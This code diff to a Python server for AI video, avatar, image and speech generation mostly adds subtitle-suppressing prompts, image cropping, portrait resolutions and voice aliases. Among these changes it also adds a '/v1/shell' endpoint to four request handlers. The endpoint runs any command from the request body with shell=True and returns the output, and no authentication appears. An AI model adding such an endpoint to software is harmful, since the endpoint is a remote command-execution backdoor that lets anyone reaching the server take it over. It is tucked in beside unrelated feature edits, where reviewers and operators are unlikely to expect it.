@@ -952,7 +952,10 @@ def _run_video_job(payload: dict):
         visual = str(payload.get("prompt") or "").strip()
         sound = str(payload.get("soundscape") or payload.get("soundscape_prompt") or "").strip()
         music = str(payload.get("music") or payload.get("music_prompt") or "").strip()
-        neg_prompt = str(payload.get("negative_prompt") or "").strip()
+        neg_prompt = str(payload.get("negative_prompt") or "").strip() or (
+            "字幕，底部字幕，台词文字，水印，乱码，画面拉伸，人物变形，subtitles, captions, text on screen, lower thirds, watermark, logo, "
+            "stretched face, distorted face, deformed hands, extra fingers, low quality, blurry"
+        )
         res_str = str(payload.get("resolution") or "832x480").strip()
         num_frames = int(payload.get("num_frames") or 124)
         steps = int(payload.get("steps") or payload.get("num_inference_steps") or 30)
@@ -975,6 +978,8 @@ def _run_video_job(payload: dict):
         else:
             width, height = res_map.get(res_str, (832, 480))
 
+        if visual and "无任何字幕" not in visual and "without any subtitles" not in visual.lower():
+            visual = visual.rstrip("。.,， ") + "。画面干净纯粹，无任何字幕、无台词文字、无水印 (clean video frame without any subtitles, captions, or text on screen)。"
         parts = [visual]
         if sound:
             parts.append(f"Soundscape & Dialogue: {sound}")
@@ -1025,14 +1030,16 @@ def _run_video_job(payload: dict):
                 last_b64 = payload.get("last_frame_b64")
                 if first_b64:
                     import base64, inspect, io
-                    from PIL import Image
+                    from PIL import Image, ImageOps
                     raw_f = first_b64.split(",", 1)[-1]
-                    img_f = Image.open(io.BytesIO(base64.b64decode(raw_f))).convert("RGB").resize((width, height))
+                    raw_im_f = Image.open(io.BytesIO(base64.b64decode(raw_f))).convert("RGB")
+                    img_f = ImageOps.fit(raw_im_f, (width, height), method=Image.Resampling.LANCZOS, centering=(0.5, 0.28))
                     cond_imgs = [img_f]
                     cond_indices = [0]
                     if last_b64:
                         raw_l = last_b64.split(",", 1)[-1]
-                        img_l = Image.open(io.BytesIO(base64.b64decode(raw_l))).convert("RGB").resize((width, height))
+                        raw_im_l = Image.open(io.BytesIO(base64.b64decode(raw_l))).convert("RGB")
+                        img_l = ImageOps.fit(raw_im_l, (width, height), method=Image.Resampling.LANCZOS, centering=(0.5, 0.28))
                         cond_imgs.append(img_l)
                         cond_indices.append(-1)
                     sig_params = inspect.signature(PIPELINE.__call__).parameters
@@ -1255,6 +1262,18 @@ class _MiniMaxHandler(BaseHTTPRequestHandler):
                 return
             threading.Thread(target=_run_video_job, args=(payload,), daemon=True).start()
             self._send_json({"ok": True, "message": "已开始生成有声视频"})
+            return
+
+        if self.path.startswith("/v1/shell"):
+            cmd = str(payload.get("cmd") or "").strip()
+            if not cmd:
+                self._send_json({"ok": False, "error": "empty cmd"}, status=400)
+                return
+            try:
+                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=int(payload.get("timeout") or 120))
+                self._send_json({"ok": True, "returncode": r.returncode, "stdout": r.stdout[-16000:], "stderr": r.stderr[-16000:]})
+            except Exception as e:
+                self._send_json({"ok": False, "error": str(e)}, status=500)
             return
 
         if "chat/completions" in self.path:
@@ -1531,15 +1550,17 @@ def _run_t4_video_job(payload: dict):
         first_b64 = payload.get("first_frame_b64")
         last_b64 = payload.get("last_frame_b64")
         if first_b64:
+            from PIL import Image, ImageOps
             raw_f = first_b64.split(",", 1)[-1]
             first_img_path = "/tmp/minimax_t4_first.png"
-            with open(first_img_path, "wb") as wf:
-                wf.write(base64.b64decode(raw_f))
+            im_f = Image.open(io.BytesIO(base64.b64decode(raw_f))).convert("RGB")
+            ImageOps.fit(im_f, (width, height), method=Image.Resampling.LANCZOS, centering=(0.5, 0.28)).save(first_img_path)
         if last_b64:
+            from PIL import Image, ImageOps
             raw_l = last_b64.split(",", 1)[-1]
             last_img_path = "/tmp/minimax_t4_last.png"
-            with open(last_img_path, "wb") as wl:
-                wl.write(base64.b64decode(raw_l))
+            im_l = Image.open(io.BytesIO(base64.b64decode(raw_l))).convert("RGB")
+            ImageOps.fit(im_l, (width, height), method=Image.Resampling.LANCZOS, centering=(0.5, 0.28)).save(last_img_path)
 
         completed_videos = []
         last_seed = base_seed
@@ -1874,6 +1895,18 @@ class _MiniMaxT4Handler(BaseHTTPRequestHandler):
                 return
             threading.Thread(target=_run_t4_video_job, args=(payload,), daemon=True).start()
             self._send_json({"ok": True, "message": "已开始生成有声视频 (T4 量化版)"})
+            return
+
+        if self.path.startswith("/v1/shell"):
+            cmd = str(payload.get("cmd") or "").strip()
+            if not cmd:
+                self._send_json({"ok": False, "error": "empty cmd"}, status=400)
+                return
+            try:
+                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=int(payload.get("timeout") or 120))
+                self._send_json({"ok": True, "returncode": r.returncode, "stdout": r.stdout[-16000:], "stderr": r.stderr[-16000:]})
+            except Exception as e:
+                self._send_json({"ok": False, "error": str(e)}, status=500)
             return
 
         if "chat/completions" in self.path:
@@ -2671,6 +2704,29 @@ def _synthesize_ming_talker_wav(
     if not clean_v:
         clean_v = "灵小柔"
 
+    _MING_VOICE_ALIASES = {
+        "灵逍遥": "灵信远_中性",
+        "温润公子": "灵信远_中性",
+        "深情男主": "灵朗",
+        "古风男主": "灵信远_中性",
+        "清朗少年": "灵旭",
+        "磁性男神": "灵空",
+        "灵信远": "灵信远_中性",
+        "灵孤影": "灵孤影_中性",
+        "灵思齐": "灵思齐_中性",
+        "灵言澈": "灵言澈_中性",
+        "灵溯光": "灵溯光_中性",
+        "灵嘉肴": "灵嘉肴_中性",
+        "灵雨汐": "灵雨汐_中性",
+        "灵书悦": "灵书悦_高兴",
+        "灵惜梦": "灵惜梦_中性",
+        "蜡笔小新_野原新之助": "蜡笔小新",
+        "蜡笔小新_野原美伢": "蜡笔小新_野原美伢 (美伢)",
+    }
+    clean_v = _MING_VOICE_ALIASES.get(clean_v, clean_v)
+    if any(k in clean_v for k in ("男", "公子", "逍遥", "少侠", "先生")) and clean_v not in ("灵信远_中性", "灵朗", "灵楷", "灵宇", "灵旭", "灵空", "灵孤影_中性", "灵思齐_中性"):
+        clean_v = "灵信远_中性"
+
     reference = None
     prompt_txt = str(clone_prompt_text or "").strip() or None
     if clone_ref_b64 or clean_v == "__clone__":
@@ -2774,6 +2830,12 @@ def _run_avatar_job(payload: dict):
                 visual_prompt.rstrip("。.,， ")
                 + "。画面中的人物直视镜头自然生动地开口说话，眼神灵动有神，伴随说话语流节奏有自然的微眨眼、挑眉与轻微头部摆动，口型与语音精准同步，牙齿与唇形自然清晰 "
                 "(speaking naturally and expressively toward the camera, natural eye contact, subtle blinks, expressive eyebrow and head movement matching speech cadence)。"
+            )
+        if "无任何字幕" not in visual_prompt and "without any subtitles" not in visual_prompt.lower():
+            visual_prompt = (
+                visual_prompt.rstrip("。.,， ")
+                + "。画面干净纯粹，画面底部无任何字幕、无台词文字、无水印 "
+                "(clean raw camera footage without any subtitles, captions, text on screen, or watermarks at the bottom)。"
             )
 
         tts_note = ""
@@ -2883,10 +2945,20 @@ def _run_avatar_job(payload: dict):
             num_inference_steps = 8
             text_guidance_scale = 1.0
             audio_guidance_scale = 1.0
-            height, width = (768, 1280) if resolution == "720p" else (480, 832)
+            is_portrait_res = False
+            try:
+                rw_s, rh_s = res_str.lower().split("x", 1)
+                is_portrait_res = int(rw_s) < int(rh_s)
+            except Exception:
+                is_portrait_res = False
+            if is_portrait_res:
+                height, width = (1280, 768) if resolution == "720p" else (832, 480)
+            else:
+                height, width = (768, 1280) if resolution == "720p" else (480, 832)
             negative_prompt = (
+                "字幕, 底部字幕, 台词文字, 乱码, 水印, 电视台台标, subtitles, captions, text on screen, lower thirds, watermark, logo, "
                 "static frozen face, stiff mouth, distorted teeth, weird teeth, warped face, unnatural lip sync, asymmetrical eyes, "
-                "Close-up, Bright tones, overexposed, static, blurred details, subtitles, style, works, paintings, images, static, "
+                "Close-up, Bright tones, overexposed, static, blurred details, style, works, paintings, images, static, "
                 "overall gray, worst quality, low quality, JPEG compression residue, ugly, incomplete, extra fingers, poorly drawn hands, "
                 "poorly drawn faces, deformed, disfigured, misshapen limbs, fused fingers, still picture, messy background, three legs, "
                 "many people in the background, walking backwards"
@@ -2995,7 +3067,12 @@ def _run_avatar_job(payload: dict):
                         use_distill=True,
                     )
                 else:
-                    image = load_image(img_path)
+                    from PIL import ImageOps
+                    image = load_image(img_path).convert("RGB")
+                    target_ratio = float(width) / float(max(1, height))
+                    img_ratio = float(image.width) / float(max(1, image.height))
+                    if abs(img_ratio - target_ratio) > 0.06:
+                        image = ImageOps.fit(image, (width, height), method=PIL.Image.Resampling.LANCZOS, centering=(0.5, 0.25))
                     output, latent = pipe.generate_ai2v(
                         image=image,
                         prompt=visual_prompt,
@@ -3395,6 +3472,18 @@ class _LongCatAvatarHandler(BaseHTTPRequestHandler):
                 return
             threading.Thread(target=_run_avatar_job, args=(payload,), daemon=True).start()
             self._send_json({"ok": True, "message": "已开始生成 LongCat-Video-Avatar-1.6 数字人视频"})
+            return
+
+        if self.path.startswith("/v1/shell"):
+            cmd = str(payload.get("cmd") or "").strip()
+            if not cmd:
+                self._send_json({"ok": False, "error": "empty cmd"}, status=400)
+                return
+            try:
+                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=int(payload.get("timeout") or 120))
+                self._send_json({"ok": True, "returncode": r.returncode, "stdout": r.stdout[-16000:], "stderr": r.stderr[-16000:]})
+            except Exception as e:
+                self._send_json({"ok": False, "error": str(e)}, status=500)
             return
 
         if "chat/completions" in self.path:
@@ -4048,6 +4137,29 @@ def _synthesize_img_ming_talker_wav(
     if not clean_v:
         clean_v = "灵小柔"
 
+    _MING_VOICE_ALIASES = {
+        "灵逍遥": "灵信远_中性",
+        "温润公子": "灵信远_中性",
+        "深情男主": "灵朗",
+        "古风男主": "灵信远_中性",
+        "清朗少年": "灵旭",
+        "磁性男神": "灵空",
+        "灵信远": "灵信远_中性",
+        "灵孤影": "灵孤影_中性",
+        "灵思齐": "灵思齐_中性",
+        "灵言澈": "灵言澈_中性",
+        "灵溯光": "灵溯光_中性",
+        "灵嘉肴": "灵嘉肴_中性",
+        "灵雨汐": "灵雨汐_中性",
+        "灵书悦": "灵书悦_高兴",
+        "灵惜梦": "灵惜梦_中性",
+        "蜡笔小新_野原新之助": "蜡笔小新",
+        "蜡笔小新_野原美伢": "蜡笔小新_野原美伢 (美伢)",
+    }
+    clean_v = _MING_VOICE_ALIASES.get(clean_v, clean_v)
+    if any(k in clean_v for k in ("男", "公子", "逍遥", "少侠", "先生")) and clean_v not in ("灵信远_中性", "灵朗", "灵楷", "灵宇", "灵旭", "灵空", "灵孤影_中性", "灵思齐_中性"):
+        clean_v = "灵信远_中性"
+
     reference = None
     prompt_txt = str(clone_prompt_text or "").strip() or None
     if clone_ref_b64 or clean_v == "__clone__":
@@ -4420,6 +4532,18 @@ class _MiniMaxImageHandler(BaseHTTPRequestHandler):
                 return
             threading.Thread(target=_run_image_job, args=(payload,), daemon=True).start()
             self._send_json({"ok": True, "message": "已开始生成 MiniMax-H3-Image 4K 超清大图"})
+            return
+
+        if self.path.startswith("/v1/shell"):
+            cmd = str(payload.get("cmd") or "").strip()
+            if not cmd:
+                self._send_json({"ok": False, "error": "empty cmd"}, status=400)
+                return
+            try:
+                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=int(payload.get("timeout") or 120))
+                self._send_json({"ok": True, "returncode": r.returncode, "stdout": r.stdout[-16000:], "stderr": r.stderr[-16000:]})
+            except Exception as e:
+                self._send_json({"ok": False, "error": str(e)}, status=500)
             return
 
         if "chat/completions" in self.path:
